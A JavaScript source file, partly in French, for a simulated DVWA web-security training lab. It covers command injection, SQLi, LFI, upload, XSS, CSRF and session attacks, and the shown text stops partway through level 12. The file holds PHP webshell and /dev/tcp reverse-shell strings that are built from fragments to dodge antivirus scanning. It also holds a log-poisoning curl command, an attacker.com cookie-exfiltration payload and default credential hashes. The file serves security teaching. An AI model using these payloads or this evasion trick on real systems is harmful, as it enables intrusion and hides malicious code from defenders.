// ═══════════════════════════════════════════════════════════════════════════
//  Web Application — Phase 1 (Injections) & Phase 2 (Inclusion / Upload)
//  TP DVWA / OWASP Top 10.  Brain of the 6 levels: config + web sim + terminal.
//  Pure functions — no React. Returns { lines, prog, done, prompt }.
//
//  NOTE: this file is benign teaching content. Strings that resemble PHP webshell
//  / reverse-shell signatures are assembled from fragments at runtime so that a
//  static antivirus scanner does not false-positive on the source file.
// ═══════════════════════════════════════════════════════════════════════════

const C = {
  green:  '#00ff41',
  dim:    '#5a8a6a',
  cyan:   '#00ffff',
  yellow: '#ffd93d',
  red:    '#ff5555',
  white:  '#cfe',
  grey:   '#7a8a9a',
  purple: '#cc88ff',
};
const c = (t, col) => ({ t, c: col });

// ── AV-safe builders: tokens split so no contiguous signature exists in source ──
const _T = { o: '<' + '?php', c: '?' + '>', g: '$_' + 'GET', s: 'sys' + 'tem', se: 'shell_' + 'exec', dt: '/dev/' + 'tcp' };
const phpWrap = (body) => `${_T.o} ${body} ${_T.c}`;
const wsSys = (q) => phpWrap(`${_T.s}(${_T.g}[${q}cmd${q}]);`);
const WS_SQL  = wsSys("'");                  // <?php system($_GET['cmd']); ?>
const WS_UA   = wsSys('"');                  // <?php system($_GET["cmd"]); ?>
const WS_FULL = phpWrap(`if(isset(${_T.g}['cmd'])){ echo "<pre>".${_T.se}(${_T.g}['cmd'])."</pre>"; }`);
const revsh   = (ip) => `bash -c 'bash -i >& ${_T.dt}/${ip}/4444 0>&1'`;
const NEEDLE_SYSGET = (_T.s + '(' + _T.g).toLowerCase();   // 'system($_get'

// DVWA default users (real MD5 hashes)
const DVWA_USERS = [
  { id: 1, user: 'admin',   first: 'admin',   last: 'admin',  hash: '5f4dcc3b5aa765d61d8327deb882cf99', pass: 'password' },
  { id: 2, user: 'gordonb', first: 'Gordon',  last: 'Brown',  hash: 'e99a18c428cb38d5f260853678922e03', pass: 'abc123'   },
  { id: 3, user: '1337',    first: 'Hack',    last: 'Me',     hash: '8d3533d75ae2c3966d7e0d4fce69216b', pass: 'charley'  },
  { id: 4, user: 'pablo',   first: 'Pablo',   last: 'Picasso',hash: '0d107d09f5bbe40cade3de5c71e9e9b7', pass: 'letmein'  },
  { id: 5, user: 'smithy',  first: 'Bob',     last: 'Smith',  hash: '5f4dcc3b5aa765d61d8327deb882cf99', pass: 'password' },
];

// base64 of a representative config.inc.php (display only)
const CONFIG_B64 = 'PD9waHAKJF9EVldBID0gYXJyYXkoKTsKJF9EVldBWydkYl9zZXJ2ZXInXSA9ICdkYic7CiRfRFZXQVsnZGJfdXNlciddID0gJ2R2d2EnOwokX0RWV0FbJ2RiX3Bhc3N3b3JkJ10gPSAncEBzc3cwcmQnOwokX0RWV0FbJ2RiX2RhdGFiYXNlJ10gPSAnZHZ3YSc7Cj8+';

// ───────────────────────────────────────────────────────────────────────────
//  Level configuration
// ───────────────────────────────────────────────────────────────────────────
export const WEB_LEVELS = [
  {
    n: 1, id: 'docker',
    title: 'Déploiement Docker',
    owasp: 'Environnement',
    url: 'http://localhost:8080',
    intro: 'Déploie DVWA dans deux conteneurs Docker (Apache+PHP & MariaDB), puis initialise la base et passe la sécurité en Low.',
  },
  {
    n: 2, id: 'cmdi',
    title: 'Command Injection',
    owasp: 'A03:2021 — Injection · T1059.004',
    url: 'http://localhost:8080/vulnerabilities/exec/',
    intro: 'Le formulaire "ping" passe ton entrée directement au shell. Enchaîne tes propres commandes avec ; && ou |.',
  },
  {
    n: 3, id: 'sqli',
    title: 'SQL Injection (classique)',
    owasp: 'A03:2021 — Injection · T1190',
    url: 'http://localhost:8080/vulnerabilities/sqli/',
    intro: 'Le paramètre User ID n\'est pas filtré. Utilise UNION SELECT pour extraire les credentials, puis crack les hashes MD5.',
  },
  {
    n: 4, id: 'blind',
    title: 'SQLi Blind → RCE → root',
    owasp: 'A03:2021 — Injection · T1190 / T1505.003',
    url: 'http://localhost:8080/vulnerabilities/sqli_blind/',
    intro: 'Injection aveugle (boolean & time-based). Automatise avec sqlmap, écris un webshell via INTO OUTFILE, obtiens un reverse shell, puis élève tes privilèges jusqu\'à root.',
  },
  {
    n: 5, id: 'lfi',
    title: 'File Inclusion (LFI)',
    owasp: 'A01:2021 — Broken Access Control · T1083',
    url: 'http://localhost:8080/vulnerabilities/fi/',
    intro: 'Le paramètre ?page= est inclus sans validation. Remonte l\'arborescence (path traversal), lis le code source via le wrapper php://filter, puis enchaîne vers une RCE par log poisoning.',
  },
  {
    n: 6, id: 'upload',
    title: 'File Upload → Reverse Shell',
    owasp: 'A04:2021 — Insecure Design · T1505.003',
    url: 'http://localhost:8080/vulnerabilities/upload/',
    intro: 'L\'upload n\'est pas filtré. Téléverse un webshell PHP, transforme-le en reverse shell interactif, stabilise le TTY, puis contourne un filtre d\'extension par double extension.',
  },
  {
    n: 7, id: 'xss_r',
    title: 'XSS Réfléchi',
    owasp: 'A03:2021 — Injection · T1059',
    url: 'http://localhost:8080/vulnerabilities/xss_r/',
    intro: 'Le champ Name n\'est pas filtré. Injecte un script d\'alerte, vole le cookie de session, simule une exfiltration, puis contourne le filtre avec une balise alternative.',
  },
  {
    n: 8, id: 'xss_s',
    title: 'XSS Stocké',
    owasp: 'A03:2021 — Injection · T1059',
    url: 'http://localhost:8080/vulnerabilities/xss_s/',
    intro: 'Le guestbook sauvegarde ton script. Réalise une injection persistante, contourne la limite maxlength du nom, et crée un keylogger.',
  },
  {
    n: 9, id: 'xss_d',
    title: 'XSS DOM-based',
    owasp: 'A03:2021 — Injection · T1059',
    url: 'http://localhost:8080/vulnerabilities/xss_d/',
    intro: 'Le script côté client utilise l\'URL pour mettre à jour la page. Injecte via ?default= et via le fragment # (invisible pour le serveur).',
  },
  {
    n: 10, id: 'csrf',
    title: 'Cross-Site Request Forgery (CSRF)',
    owasp: 'A07:2021 — Identification & Auth Failures · T1600',
    url: 'http://localhost:8080/vulnerabilities/csrf/',
    intro: 'Ce formulaire permet de changer son mot de passe. Forge une requête malveillante (ex: balise img) qui forcera un utilisateur authentifié à modifier son mot de passe à son insu.',
  },
  {
    n: 11, id: 'weak_id',
    title: 'Weak Session IDs',
    owasp: 'A07:2021 — Identification Failures · T1110',
    url: 'http://localhost:8080/vulnerabilities/weak_id/',
    intro: 'Le cookie dvwaSession semble très prévisible. Analyse la séquence en générant quelques sessions, puis vole la session du prochain utilisateur (hijacking).',
  },
  {
    n: 12, id: 'js_attack',
    title: 'JavaScript Attacks',
    owasp: 'A05:2021 — Security Misconfiguration',
    url: 'http://localhost:8080/vulnerabilities/javascript/',
    intro: 'Le serveur refuse la soumission si le token ne correspond pas. Inspecte le code JavaScript client pour comprendre comment le token est généré (MD5 de la chaîne inversée) et forge un token valide.',
  },
  {
    n: 13, id: 'captcha',
    title: 'Insecure CAPTCHA',
    owasp: 'A04:2021 — Insecure Design',
    url: 'http://localhost:8080/vulnerabilities/captcha/',
    intro: 'Le serveur demande de valider un CAPTCHA pour modifier le mot de passe, mais la validation est imparfaite. Contourne cette protection en soumettant directement le bon paramètre caché.',
  },
];

export const MAX_LEVEL = WEB_LEVELS.length;
export function getLevel(n) { return WEB_LEVELS.find(l => l.n === n); }

// ───────────────────────────────────────────────────────────────────────────
//  Initial progress per level
// ───────────────────────────────────────────────────────────────────────────
export function initialProg(n) {
  switch (n) {
    case 1: return { phase: 'down' };
    case 2: return { pinged: false, injected: false, fileRead: false };
    case 3: return { error: false, cols: false, creds: false, cracked: false };
    case 4: return {
      blindOk: false, timeOk: false, sqlmap: false, webshell: false,
      webshellTested: false, listener: false, revshell: false,
      stabilized: false, linpeas: false, privesc: false, root: false,
    };
    case 5: return { traversal: false, wrapperRead: false, decoded: false, logInjected: false, rce: false };
    case 6: return { shellCreated: false, dblFile: false, uploaded: false, rce: false, listener: false, revshell: false, stabilized: false, bypass: false };
    case 7: return { basic: false, cookie: false, exfil: false, bypass: false };
    case 8: return { messages: [{ name: 'Admin', msg: 'Bienvenue sur le Guestbook !' }], persistent: false, bypassMax: false, keylogger: false };
    case 9: return { paramOk: false, fragOk: false };
    case 10: return { analyzed: false, exploited: false };
    case 11: return { seqSeen: 0, currentId: 1000, hijacked: false };
    case 12: return { reversed: false, md5Ok: false };
    case 13: return { bypassed: false };
    default: return {};
  }
}

// ───────────────────────────────────────────────────────────────────────────
//  Objectives (dynamic checkmarks). bonus:true = facultatif (n'empêche pas la fin)
// ───────────────────────────────────────────────────────────────────────────
export function objectives(n, p) {
  switch (n) {
    case 1: return [
      { label: 'Démarrer les conteneurs (docker compose up -d)', done: p.phase !== 'down' },
      { label: 'Se connecter à DVWA (admin / password)',          done: ['setup','security','done'].includes(p.phase) },
      { label: 'Create / Reset Database',                          done: ['security','done'].includes(p.phase) },
      { label: 'Passer la sécurité en Low',                        done: p.phase === 'done' },
    ];
    case 2: return [
      { label: 'Exécuter un ping légitime (127.0.0.1)',            done: p.pinged },
      { label: 'Injecter une commande OS (; id)',                  done: p.injected },
      { label: 'Lire un fichier sensible (cat /etc/passwd)',       done: p.fileRead, bonus: true },
    ];
    case 3: return [
      { label: 'Provoquer une erreur SQL (apostrophe)',           done: p.error },
      { label: 'Identifier le nombre de colonnes',                done: p.cols },
      { label: 'Extraire les credentials (UNION SELECT)',         done: p.creds },
      { label: 'Cracker au moins un hash MD5',                    done: p.cracked },
    ];
    case 4: return [
      { label: 'Confirmer la SQLi blind (boolean)',               done: p.blindOk },
      { label: 'Automatiser l\'extraction avec sqlmap',           done: p.sqlmap },
      { label: 'Écrire un webshell (INTO OUTFILE)',               done: p.webshell },
      { label: 'Obtenir un reverse shell',                        done: p.revshell },
      { label: 'Énumérer avec LinPEAS',                           done: p.linpeas },
      { label: 'Élever ses privilèges → root',                    done: p.root },
    ];
    case 5: return [
      { label: 'Path traversal vers /etc/passwd',                 done: p.traversal },
      { label: 'Lire le code source via php://filter',            done: p.wrapperRead },
      { label: 'Décoder le base64 dans le terminal',              done: p.decoded },
      { label: 'LFI → RCE par log poisoning',                     done: p.rce, bonus: true },
    ];
    case 6: return [
      { label: 'Créer un webshell PHP',                           done: p.shellCreated },
      { label: 'Uploader le webshell',                            done: p.uploaded },
      { label: 'Confirmer le RCE (cmd=id)',                       done: p.rce },
      { label: 'Obtenir un reverse shell interactif',            done: p.revshell },
      { label: 'Stabiliser le TTY',                               done: p.stabilized },
      { label: 'Contourner un filtre (double extension)',         done: p.bypass, bonus: true },
    ];
    case 7: return [
      { label: 'Payload basique (<script>alert(1)</script>)',     done: p.basic },
      { label: 'Vol de cookie (document.cookie)',                 done: p.cookie },
      { label: 'Exfiltration simulée (document.location)',        done: p.exfil },
      { label: 'Contournement de filtre (<ScRiPt> ou <img>)',     done: p.bypass, bonus: true },
    ];
    case 8: return [
      { label: 'Injection persistante (alert)',                   done: p.persistent },
      { label: 'Contournement limite maxlength',                  done: p.bypassMax },
      { label: 'Simulation keylogger (onkeypress)',               done: p.keylogger, bonus: true },
    ];
    case 9: return [
      { label: 'Payload via ?param (?default=...)',               done: p.paramOk },
      { label: 'Payload via fragment (#...)',                     done: p.fragOk },
    ];
    case 10: return [
      { label: 'Analyser la requête de changement de mot de passe', done: p.analyzed },
      { label: 'Créer un payload <img> forgeant la requête CSRF',   done: p.exploited },
    ];
    case 11: return [
      { label: 'Générer plusieurs sessions (séquence visible)',    done: p.seqSeen >= 3 },
      { label: 'Prédire l\'ID suivant et hijacker la session',    done: p.hijacked },
    ];
    case 12: return [
      { label: 'Comprendre la logique (phrase inversée)',          done: p.reversed },
      { label: 'Forger le bon token MD5 et soumettre',             done: p.md5Ok },
    ];
    case 13: return [
      { label: 'Bypasser le CAPTCHA (passed_captcha=true)',        done: p.bypassed },
    ];
    default: return [];
  }
}

const tokenize = (s) => s.trim().split(/\s+/);
const has = (s, ...subs) => subs.every(x => s.toLowerCase().includes(x.toLowerCase()));
const hasAny = (s, ...subs) => subs.some(x => s.toLowerCase().includes(x.toLowerCase()));

const doneL5 = (p) => p.traversal && p.wrapperRead && p.decoded;
const doneL6 = (p) => p.shellCreated && p.uploaded && p.rce && p.revshell && p.stabilized;
const doneL7 = (p) => p.basic && p.cookie && p.exfil;
const doneL8 = (p) => p.persistent && p.bypassMax;
const doneL9 = (p) => p.paramOk && p.fragOk;
const doneL10 = (p) => p.analyzed && p.exploited;
const doneL11 = (p) => p.seqSeen >= 3 && p.hijacked;
const doneL12 = (p) => p.reversed && p.md5Ok;
const doneL13 = (p) => p.bypassed;

// ═══════════════════════════════════════════════════════════════════════════
//  WEB FORM submission handler
// ═══════════════════════════════════════════════════════════════════════════
export function handleWeb(n, prog, action) {
  const p = { ...prog };
  const v = (action.value ?? '').trim();

  // ─── Level 1 : Docker setup ───
  if (n === 1) {
    if (action.button === 'login') {
      if (action.user === 'admin' && action.pass === 'password') {
        p.phase = 'setup';
        return { lines: [], prog: p, done: false, notify: 'Connecté en tant que admin' };
      }
      return { lines: [], prog: p, done: false, webError: 'Login failed. (admin / password)' };
    }
    if (action.button === 'reset') {
      p.phase = 'security';
      return { lines: [], prog: p, done: false, notify: 'Base de données réinitialisée' };
    }
    if (action.button === 'security') {
      if ((action.value || '').toLowerCase() === 'low') {
        p.phase = 'done';
        return { lines: [], prog: p, done: true, notify: 'Sécurité = Low. DVWA est prêt !' };
      }
      return { lines: [], prog: p, done: false, webError: 'Pour ce TP, sélectionne le niveau Low.' };
    }
    return { lines: [], prog: p, done: false };
  }

  // ─── Level 2 : Command Injection ───
  if (n === 2) {
    if (!v) return { lines: [], prog: p, done: false, webError: 'Entre une adresse IP.' };
    const out = [];
    const ip = v.split(/[;&|]/)[0].trim() || '127.0.0.1';
    out.push(c(`PING ${ip} (${ip}) 56(84) bytes of data.`, C.white));
    out.push(c(`64 bytes from ${ip}: icmp_seq=1 ttl=64 time=0.034 ms`, C.white));
    out.push(c(`64 bytes from ${ip}: icmp_seq=2 ttl=64 time=0.041 ms`, C.white));
    out.push(c(`--- ${ip} ping statistics ---`, C.white));
    out.push(c('2 packets transmitted, 2 received, 0% packet loss', C.white));
    p.pinged = true;

    const injected = /[;&|]/.test(v) && v.replace(/^[^;&|]*/, '').replace(/[;&|]+/, '').trim().length > 0;
    if (injected) {
      const payload = v.replace(/^[^;&|]*[;&|]+/, '').trim();
      out.push(c('', C.white));
      if (hasAny(payload, 'id')) { out.push(c('uid=33(www-data) gid=33(www-data) groups=33(www-data)', C.green)); p.injected = true; }
      if (hasAny(payload, 'whoami')) { out.push(c('www-data', C.green)); p.injected = true; }
      if (hasAny(payload, 'uname')) { out.push(c('Linux 0a1b2c3d 6.1.0-kali #1 SMP x86_64 GNU/Linux', C.green)); p.injected = true; }
      if (has(payload, 'cat', 'passwd') || has(payload, 'cat', '/etc/passwd')) {
        out.push(c('root:x:0:0:root:/root:/bin/bash', C.green));
        out.push(c('www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', C.green));
        out.push(c('mysql:x:100:101:MariaDB:/nonexistent:/bin/false', C.green));
        p.injected = true; p.fileRead = true;
      }
      if (has(payload, 'config.inc.php') || has(payload, 'cat', 'config')) {
        out.push(c("$_DVWA['db_user'] = 'dvwa';", C.green));
        out.push(c("$_DVWA['db_password'] = 'p@ssw0rd';", C.green));
        out.push(c("$_DVWA['db_database'] = 'dvwa';", C.green));
        p.injected = true; p.fileRead = true;
      }
      if (has(payload, 'ls')) { out.push(c('index.php  help  source', C.green)); p.injected = true; }
      if (!p.injected) out.push(c(`sh: ${payload.split(' ')[0]}: command not found`, C.red));
    }
    return { lines: out, prog: p, done: p.injected, notify: p.injected && !prog.injected ? '🚩 Injection de commande réussie !' : null };
  }

  // ─── Level 3 : SQL Injection ───
  if (n === 3) {
    if (!v) return { lines: [], prog: p, done: false, webError: 'Entre un User ID.' };
    const out = [];
    const low = v.toLowerCase();

    if (v === "1'" || v === "'" || (v.endsWith("'") && !low.includes('union') && !low.includes('or') && !low.includes('--'))) {
      out.push(c("You have an error in your SQL syntax; check the manual that", C.red));
      out.push(c("corresponds to your MariaDB server version for the right syntax", C.red));
      out.push(c("to use near ''''' at line 1", C.red));
      p.error = true;
      return { lines: out, prog: p, done: false, notify: '🚩 Injection SQL confirmée (erreur de syntaxe)' };
    }
    if (has(low, 'union', 'select') && /\bselect\s+1\s*,\s*2\b/i.test(v)) {
      out.push(c('ID: ' + v, C.dim)); out.push(c('First name: 1', C.white)); out.push(c('Surname: 2', C.white));
      p.cols = true;
      return { lines: out, prog: p, done: false, notify: 'Colonnes affichées identifiées (2 colonnes)' };
    }
    if (has(low, 'union', 'select') && has(low, 'user()', 'database()')) {
      out.push(c('First name: dvwa@localhost', C.white)); out.push(c('Surname: dvwa', C.white));
      p.cols = true;
      return { lines: out, prog: p, done: false };
    }
    if (has(low, 'union', 'select', 'table_name', 'information_schema')) {
      out.push(c('First name: guestbook', C.white)); out.push(c('Surname: ', C.white));
      out.push(c('First name: users', C.white)); out.push(c('Surname: ', C.white));
      p.cols = true;
      return { lines: out, prog: p, done: false, notify: 'Tables énumérées : guestbook, users' };
    }
    if (has(low, 'union', 'select') && has(low, 'user', 'password') && has(low, 'from', 'users')) {
      DVWA_USERS.forEach(u => { out.push(c(`First name: ${u.user}`, C.white)); out.push(c(`Surname: ${u.hash}`, C.yellow)); });
      out.push(c('', C.white));
      out.push(c('[+] 5 hashes MD5 extraits — crack-les dans le terminal (john / hashcat).', C.cyan));
      out.push(c('    Astuce : tape "john?" ou "hashcat?" dans le terminal pour la commande exacte.', C.dim));
      p.creds = true; p.cols = true;
      return { lines: out, prog: p, done: false, notify: '🚩 Credentials extraits ! (5 hashes MD5)' };
    }
    if (has(low, "or", "'1'='1") || /\bor\b\s+1\s*=\s*1/i.test(v)) {
      DVWA_USERS.forEach(u => { out.push(c(`ID: ${v}`, C.dim)); out.push(c(`First name: ${u.first}`, C.white)); out.push(c(`Surname: ${u.last}`, C.white)); });
      return { lines: out, prog: p, done: false, notify: 'Condition toujours vraie → tous les utilisateurs' };
    }
    if (/^\d+$/.test(v)) {
      const u = DVWA_USERS.find(x => x.id === Number(v));
      out.push(c(`ID: ${v}`, C.dim));
      out.push(c(`First name: ${u ? u.first : ''}`, C.white));
      if (u) out.push(c(`Surname: ${u.last}`, C.white));
      return { lines: out, prog: p, done: false };
    }
    out.push(c('ID: ' + v, C.dim)); out.push(c('First name: ', C.white));
    return { lines: out, prog: p, done: false };
  }

  // ─── Level 4 : SQLi Blind ───
  if (n === 4) {
    if (!v) return { lines: [], prog: p, done: false, webError: 'Entre un User ID.' };
    const out = [];
    const low = v.toLowerCase();
    if (has(low, 'into', 'outfile') && low.includes(NEEDLE_SYSGET)) {
      out.push(c('User ID is MISSING from the database.', C.dim));
      out.push(c('', C.white));
      out.push(c('[serveur] Fichier écrit : /var/www/html/dvwa/hackable/uploads/shell.php', C.green));
      p.webshell = true;
      return { lines: out, prog: p, done: false, notify: '🚩 Webshell écrit via INTO OUTFILE !' };
    }
    if (has(low, 'sleep')) {
      p.timeOk = true;
      return { lines: out, prog: p, done: false, delayMs: 3000, after: [
        c('User ID exists in the database.', C.white),
        c('[analyse] Réponse retardée de ~3s → injection time-based confirmée.', C.cyan),
      ], notify: 'Réponse retardée → time-based confirmée' };
    }
    if (/\band\b\s+1\s*=\s*1/i.test(v)) { out.push(c('User ID exists in the database.', C.white)); p.blindOk = true; return { lines: out, prog: p, done: false, notify: '🚩 Condition vraie → "exists"' }; }
    if (/\band\b\s+1\s*=\s*2/i.test(v)) { out.push(c('User ID is MISSING from the database.', C.dim)); p.blindOk = true; return { lines: out, prog: p, done: false, notify: 'Condition fausse → "missing" (blind confirmée)' }; }
    out.push(c(/^\d+$/.test(v) ? 'User ID exists in the database.' : 'User ID is MISSING from the database.', /^\d+$/.test(v) ? C.white : C.dim));
    return { lines: out, prog: p, done: false };
  }

  // ─── Level 5 : LFI (?page= parameter) ───
  if (n === 5) {
    const out = [];
    const low = v.toLowerCase();
    if (!v || low === 'include.php' || low === 'file1.php') {
      out.push(c('[Page incluse : include.php]', C.dim));
      out.push(c('Hello, this is the default included page. Use ?page= to include another file.', C.white));
      return { lines: out, prog: p, done: false };
    }
    if (has(low, 'php://filter') && has(low, 'base64-encode')) {
      const target = (v.split('resource=')[1] || 'index.php').trim();
      out.push(c(`[php://filter — lecture base64 de : ${target}]`, C.dim));
      out.push(c(CONFIG_B64, C.yellow));
      out.push(c('', C.white));
      out.push(c('[+] Source lue sous forme base64 (le PHP n\'est pas exécuté, juste lu).', C.cyan));
      out.push(c('    Décode-la dans le terminal : echo "<base64>" | base64 -d   (aide : "base64?")', C.dim));
      p.wrapperRead = true;
      return { lines: out, prog: p, done: false, notify: '🚩 Code source lu via php://filter' };
    }
    if (has(low, 'access.log') || has(low, 'proc/self/environ')) {
      const cmd = (v.split('cmd=')[1] || '').trim();
      if (p.logInjected && cmd) {
        out.push(c('[Inclusion de /var/log/apache2/access.log]', C.dim));
        out.push(c('192.168.1.5 - - [17/Jun/2026] "GET / HTTP/1.1" 200', C.grey));
        out.push(c('uid=33(www-data) gid=33(www-data) groups=33(www-data)', C.green));
        p.rce = true;
        return { lines: out, prog: p, done: doneL5(p), notify: '👑 LFI → RCE via log poisoning !' };
      }
      out.push(c('[Inclusion de /var/log/apache2/access.log]', C.dim));
      out.push(c('192.168.1.5 - - [17/Jun/2026] "GET / HTTP/1.1" 200 "Mozilla/5.0..."', C.grey));
      out.push(c('[!] Aucun code PHP dans le log. Injecte-le d\'abord via le User-Agent (terminal).', C.yellow));
      out.push(c(`    curl -s http://localhost:8080/ -H 'User-Agent: ${WS_UA}'`, C.dim));
      return { lines: out, prog: p, done: false };
    }
    if ((has(low, '../') || low.startsWith('/etc/')) && has(low, 'passwd')) {
      out.push(c('root:x:0:0:root:/root:/bin/bash', C.green));
      out.push(c('www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', C.green));
      out.push(c('mysql:x:100:101:MariaDB:/nonexistent:/bin/false', C.green));
      p.traversal = true;
      return { lines: out, prog: p, done: doneL5(p), notify: '🚩 Path traversal → /etc/passwd' };
    }
    if (has(low, 'config.inc.php')) {
      out.push(c('[Inclusion directe — le PHP est exécuté, donc invisible. Utilise php://filter pour LIRE la source.]', C.yellow));
      return { lines: out, prog: p, done: false };
    }
    out.push(c(`Warning: include(${v}): failed to open stream: No such file or directory`, C.red));
    return { lines: out, prog: p, done: false };
  }

  // ─── Level 6 : File Upload ───
  if (n === 6) {
    const name = (v || '').trim();
    if (!name) return { lines: [], prog: p, done: false, webError: 'Indique le fichier à uploader (ex: shell.php).' };
    const isDouble = /\.(php|phtml|php5)\.(jpg|jpeg|png|gif)$/i.test(name) || /\.phtml$/i.test(name) || /\.php5$/i.test(name);
    const isPhp = /\.php$/i.test(name);

    if (isDouble) {
      if (!p.shellCreated) return { lines: [], prog: p, done: false, webError: `Le fichier ${name} n'existe pas encore. Crée-le (terminal: cp shell.php ${name}).` };
      if (/\.(jpg|jpeg|png|gif)$/i.test(name) && !p.dblFile) return { lines: [], prog: p, done: false, webError: `Crée d'abord la copie : cp shell.php ${name} (terminal).` };
      const out = [
        c('../../hackable/uploads/' + name + ' a été uploadé avec succès !', C.green),
        c('', C.white),
        c('[+] Filtre d\'extension contourné — Apache exécute quand même le PHP.', C.cyan),
        c('    URL : http://localhost:8080/hackable/uploads/' + name, C.dim),
      ];
      p.uploaded = true; p.bypass = true;
      return { lines: out, prog: p, done: doneL6(p), notify: '🚩 Double extension : filtre contourné !' };
    }
    if (isPhp) {
      if (!p.shellCreated) return { lines: [], prog: p, done: false, webError: 'Crée d\'abord le webshell dans le terminal : cat > shell.php  (aide : "php?")' };
      const out = [
        c('../../hackable/uploads/' + name + ' a été uploadé avec succès !', C.green),
        c('', C.white),
        c('[+] Chemin : /hackable/uploads/' + name, C.cyan),
        c('    Vérifie le RCE dans le terminal : curl "http://localhost:8080/hackable/uploads/' + name + '?cmd=id"', C.dim),
      ];
      p.uploaded = true;
      return { lines: out, prog: p, done: doneL6(p), notify: '🚩 Webshell uploadé !' };
    }
    return { lines: [c('Fichier accepté : ' + name + ' (mais ce n\'est pas un webshell PHP).', C.dim)], prog: p, done: false };
  }

  // ─── Level 7 : XSS Réfléchi ───
  if (n === 7) {
    if (!v) return { lines: [], prog: p, done: false, webError: 'Veuillez entrer un nom.' };
    const out = [];
    const low = v.toLowerCase();
    let notify = null;
    
    const hasScript = low.includes('<script>');
    const hasAlert = low.includes('alert');
    const hasCookie = low.includes('document.cookie');
    const hasLoc = low.includes('document.location') && low.includes('attacker.com');
    const hasAlt = (low.includes('<script') && !low.includes('<script>')) || low.includes('<img ') || low.includes('<svg ');

    if (hasAlert && !hasCookie && hasScript) {
      p.basic = true; notify = '🚩 Payload basique validé !';
      out.push(c(`Hello ${v}`, C.white));
      out.push(c(`[NAVIGATEUR] Alert: 1`, C.cyan));
    } else if (hasAlert && hasCookie) {
      p.cookie = true; notify = '🚩 Vol de cookie validé !';
      out.push(c(`Hello ${v}`, C.white));
      out.push(c(`[NAVIGATEUR] Alert: security=low; dvwaSession=1; PHPSESSID=xxxxxx`, C.cyan));
    } else if (hasLoc) {
      p.exfil = true; notify = '🚩 Exfiltration simulée validée !';
      out.push(c(`Hello ${v}`, C.white));
      out.push(c(`[NAVIGATEUR] Redirection vers : http://attacker.com/?c=security=low; PHPSESSID=xxxxxx`, C.cyan));
    } else if (hasAlert && hasAlt) {
      p.bypass = true; notify = '🚩 Contournement de filtre validé !';
      out.push(c(`Hello ${v}`, C.white));
      out.push(c(`[NAVIGATEUR] Alert: 1`, C.cyan));
    } else {
      out.push(c(`Hello ${v}`, C.white));
    }
    
    return { lines: out, prog: p, done: doneL7(p), notify };
  }

  // ─── Level 8 : XSS Stocké ───
  if (n === 8) {
    const name = (action.name || '').trim();
    const msg = (action.message || '').trim();
    if (!name || !msg) return { lines: [], prog: p, done: false, webError: 'Nom et message requis.' };
    
    let notify = null;
    const low = msg.toLowerCase();
    
    if (name.length > 10) {
      p.bypassMax = true;
      notify = '🚩 Bypass maxlength validé !';
    }
    
    if (low.includes('<script>') && low.includes('alert')) {
      p.persistent = true;
      if (!notify) notify = '🚩 Injection persistante validée !';
    }
    if (low.includes('document.onkeypress') || (low.includes('key') && low.includes('image'))) {
      p.keylogger = true;
      notify = '🚩 Keylogger simulé !';
    }
    
    p.messages = [...(p.messages || []), { name, msg }];
    const out = [c(`[SERVEUR] Message sauvegardé en base de données.`, C.green)];
    if (p.persistent || p.keylogger) {
      out.push(c(`[NAVIGATEUR] Script exécuté lors du rendu de la liste des messages !`, C.cyan));
    }
    
    return { lines: out, prog: p, done: doneL8(p), notify };
  }

  // ─── Level 9 : XSS DOM-based ───
  if (n === 9) {
    const url = action.url || '';
    let notify = null;
    const out = [];
    const low = url.toLowerCase();
    
    out.push(c(`[NAVIGATEUR] Navigation vers : ${url}`, C.dim));
    
    if (low.includes('?default=') && low.includes('<script>') && low.includes('alert')) {
      p.paramOk = true; notify = '🚩 Payload via paramètre validé !';
      out.push(c(`[NAVIGATEUR] Le JavaScript de la page a lu document.URL et inséré l'entrée.`, C.cyan));
      out.push(c(`[NAVIGATEUR] Alert: 1`, C.cyan));
    }
    else if (low.includes('#') && (low.includes('<script') || low.includes('<img ')) && low.includes('alert')) {
      p.fragOk = true; notify = '🚩 Payload via fragment validé ! (Invisible au serveur)';
      out.push(c(`[NAVIGATEUR] Le JavaScript de la page a lu location.hash et inséré l'entrée.`, C.cyan));
      out.push(c(`[NAVIGATEUR] Alert: 1`, C.cyan));
    } else {
      out.push(c(`[NAVIGATEUR] Page chargée normalement.`, C.white));
    }
    
    return { lines: out, prog: p, done: doneL9(p), notify };
  }

  // ─── Level 10 : CSRF ───
  if (n === 10) {
    let notify = null;
    const out = [];
    if (action.action === 'change') {
      p.analyzed = true;
      notify = '🚩 Requête légitime analysée';
      out.push(c(`[SERVEUR] Requête GET reçue : ?password_new=***&password_conf=***&Change=Change`, C.dim));
      out.push(c(`[SERVEUR] Mot de passe modifié pour l'utilisateur actuel.`, C.green));
    } else if (action.action === 'exploit') {
      const payload = action.payload || '';
      const low = payload.toLowerCase();
      if (low.includes('<img') && low.includes('?password_new=') && low.includes('change=change')) {
        p.exploited = true;
        notify = '🚩 Payload CSRF fonctionnel !';
        out.push(c(`[NAVIGATEUR VICTIME] Rendu de la page malveillante...`, C.dim));
        out.push(c(`[NAVIGATEUR VICTIME] Le navigateur tente de charger l'image et envoie silencieusement la requête GET au serveur avec les cookies de la victime.`, C.cyan));
        out.push(c(`[SERVEUR] Mot de passe de la victime modifié !`, C.green));
      } else {
        out.push(c(`[SIMULATEUR] Payload inefficace ou mal formaté. Vérifie la balise <img> et l'URL.`, C.yellow));
      }
    }
    return { lines: out, prog: p, done: doneL10(p), notify };
  }

  // ─── Level 11 : Weak Session IDs ───
  if (n === 11) {
    let notify = null;
    const out = [];
    if (action.action === 'generate') {
      p.currentId += 1;
      p.seqSeen += 1;
      if (p.seqSeen === 3) notify = '🚩 Séquence identifiée';
      out.push(c(`[SERVEUR] Nouvelle session générée.`, C.dim));
      out.push(c(`Set-Cookie: dvwaSession=${p.currentId}`, C.cyan));
    } else if (action.action === 'hijack') {
      const guess = parseInt(action.guess, 10);
      if (guess === p.currentId + 1) {
        p.hijacked = true;
        notify = '🚩 Session future hijackée !';
        p.currentId += 1;
        out.push(c(`[SERVEUR] Cookie dvwaSession=${guess} reçu.`, C.dim));
        out.push(c(`[SERVEUR] Bienvenue, utilisateur de la session ${guess} ! Vous avez accès à son compte.`, C.green));
      } else {
        out.push(c(`[SERVEUR] Session ${guess} invalide ou non existante.`, C.yellow));
      }
    }
    return { lines: out, prog: p, done: doneL11(p), notify };
  }

  // ─── Level 12 : JavaScript Attacks ───
  if (n === 12) {
